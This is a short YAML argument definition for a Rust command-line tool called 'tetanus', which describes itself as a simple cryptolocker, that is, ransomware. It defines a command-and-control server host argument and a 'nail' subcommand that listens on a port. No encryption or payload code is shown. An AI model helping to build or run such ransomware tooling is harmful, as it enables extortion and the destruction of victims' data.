name: tetanus
version: "0.1.0"
author: Jason Ross <algorythm@gmail.com>
about: A simple cryptolocker tool written in Rust
args:
    - c2:
        help: sets the command and control server host
        takes_value: true
        value_name: c2
        index: 1
subcommands:
    - nail:
        about: runs tetanus in command mode
        args:
            - port:
                short: p
                help: sets the port to listen on
                value_name: port
